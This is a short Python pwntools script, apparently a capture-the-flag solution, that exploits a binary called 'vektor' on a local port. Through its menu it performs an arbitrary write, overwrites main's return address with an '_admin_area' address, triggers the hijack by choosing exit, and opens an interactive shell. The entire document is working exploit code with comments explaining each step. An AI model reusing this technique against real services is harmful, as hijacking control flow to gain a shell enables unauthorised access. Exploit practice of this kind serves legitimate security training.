from pwn import *

io = remote("0", 2323)
#io = process('./vektor')
#gdb.attach(io)

#Select Add VEKTOR
payload = "1\n"

#Set offset for the arbitrary write
payload += "33\n"

#Set _admin_area offset converted to decimal
payload += "134514045\n"

#Select Exit so we can hit the overwritten main return address
payload += "5\n"

#Send the payload
io.send(payload)

#Change mode to interactive since we got shell
io.interactive()
